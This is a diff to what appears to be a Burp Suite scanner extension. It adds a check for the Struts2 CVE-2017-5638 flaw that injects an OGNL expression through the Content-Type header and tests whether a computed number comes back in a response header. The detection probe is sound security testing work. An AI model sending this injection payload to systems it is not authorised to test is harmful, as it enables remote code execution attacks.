@@ -28,7 +28,7 @@ try:
 except ImportError:
     print "Failed to load dependencies. This issue may be caused by using the unstable Jython 2.7 beta."
 
-VERSION = "1.0.13"
+VERSION = "1.0.14"
 FAST_MODE = False
 DEBUG = False
 callbacks = None
@@ -71,6 +71,7 @@ class PerRequestScans(IScannerCheck):
         base_resp_print = tagmap(base_resp_string)
         issues = self.doHostHeaderScan(basePair, base_resp_string, base_resp_print)
         issues.extend(self.doCodePathScan(basePair, base_resp_print))
+        issues.extend(self.doStrutsScan(basePair))
         return issues
 
 
@@ -97,6 +98,25 @@ class PerRequestScans(IScannerCheck):
 
         else:
             return False
+
+    def doStrutsScan(self, basePair):
+
+        x = random.randint(999, 9999)
+        y = random.randint(999, 9999)
+        (ignore, req) = setHeader(basePair.getRequest(), 'Content-Type', "%{#context['com.opensymphony.xwork2.dispatcher.HttpServletResponse'].addHeader('X-Ack',"+str(x)+"*"+str(y)+")}.multipart/form-data", True)
+        attack = callbacks.makeHttpRequest(basePair.getHttpService(), req)
+
+        if str(x*y) in '\n'.join(helpers.analyzeResponse(attack.getResponse()).getHeaders()):
+            return [CustomScanIssue(basePair.getHttpService(), helpers.analyzeRequest(basePair).getUrl(),
+                [attack],
+                'Struts2 RCE',
+                "The application appears to be vulnerable to CVE-2017-5638, enabling arbitrary code execution.",
+                'Firm', 'High')]
+
+        return []
+
+
+
 
     def doCodePathScan(self, basePair, base_resp_print):
         xml_resp, xml_req = self._codepath_attack(basePair, 'application/xml')
@@ -616,7 +636,7 @@ def debug_msg(message):
 
 
 # FIXME breaking some requests somehow
-def setHeader(request, name, value):
+def setHeader(request, name, value, add_if_not_present=False):
     # find the end of the headers
     prev = ''
     i = 0
@@ -646,6 +666,10 @@ def setHeader(request, name, value):
     # stitch the request back together
     if modified:
         modified_request = helpers.stringToBytes('\n'.join(headers) + '\n') + request[body_start:]
+    elif add_if_not_present:
+        # probably doesn't work with POST requests
+        real_start = helpers.analyzeRequest(request).getBodyOffset()
+        modified_request = request[:real_start-2] + helpers.stringToBytes(name + ': ' + value + '\r\n\r\n') + request[real_start:]
     else:
         modified_request = request
 
